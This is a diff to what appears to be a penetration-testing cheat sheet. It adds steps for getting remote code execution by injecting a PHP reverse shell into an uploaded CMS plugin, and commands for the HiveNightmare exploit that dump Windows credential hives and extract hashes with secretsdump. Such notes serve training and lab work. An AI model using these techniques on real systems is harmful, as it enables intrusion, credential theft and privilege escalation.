@@ -267,6 +267,15 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   wpscan --url http://10.10.10.10 --usernames user_list.txt --passwords rockyou.txt
   ```
 
+### CMS Plugin / Extension RCE
+- **General Scenario**: You have admin access to a CMS (Schlix, WordPress, Joomla) and can upload or edit extensions.
+- **Method**:
+  1. Locate the plugin/theme management section.
+  2. Download a legitimate plugin or find an existing one's `index.php` or `packageinfo.inc.php`.
+  3. Inject a PHP Reverse Shell.
+  4. Zip the modified folder and upload/install it.
+  5. Trigger by visiting the plugin's path or its "About/Settings" page.
+
 ### SQL Injection & MSSQL
 - **Sqlmap (Automated):**
   ```bash
@@ -374,6 +383,13 @@ Include multiple variations for different OS targets and filtering environments.
   ```powershell
   PrintSpoofer.exe -c "cmd.exe" -i
   ```
+
+- **HiveNightmare (SeriousSAM / CVE-2021-36934):**
+  - *Requirement*: Win 10 Build 1809 to 19043 (with VSS enabled).
+  - *Action*: Allows reading SAM/SECURITY/SYSTEM hives as a normal user.
+  - `.\HiveNightmare.exe`
+  - *Result*: Creates `SAM`, `SECURITY`, `SYSTEM` files in the current folder.
+  - *Extraction*: `impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL`
 
 - **AlwaysInstallElevated (Registry Abuse):**
   - *Verify*: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
